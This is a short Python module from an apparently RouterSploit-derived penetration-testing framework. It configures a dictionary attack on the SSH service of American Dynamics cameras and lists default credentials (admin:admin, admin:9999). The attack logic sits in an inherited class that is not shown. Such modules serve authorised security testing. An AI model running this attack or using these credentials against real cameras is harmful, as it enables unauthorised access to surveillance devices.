from thgconsole.core.exploit import *
from thgconsole.modules.creds.generic.ssh_default import Exploit as SSHDefault


class Exploit(SSHDefault):
    __info__ = {
        "name": "American Dynamics Camera Default SSH Creds",
        "description": "Module performs dictionary attack against American Dynamics Camera SSH service. "
                       "If valid credentials are found, they are displayed to the user.",
        "authors": (
            "Marcin Bury <marcin[at]threat9.com>",  # thgconsole module
        ),
        "devices": (
            "American Dynamics Camera",
        ),
    }

    target = OptIP("", "Target IPv4, IPv6 address or file with ip:port (file://)")
    port = OptPort(22, "Target SSH port")

    threads = OptInteger(1, "Number of threads")
    defaults = OptWordlist("admin:admin,admin:9999", "User:Pass or file with default credentials (file://)")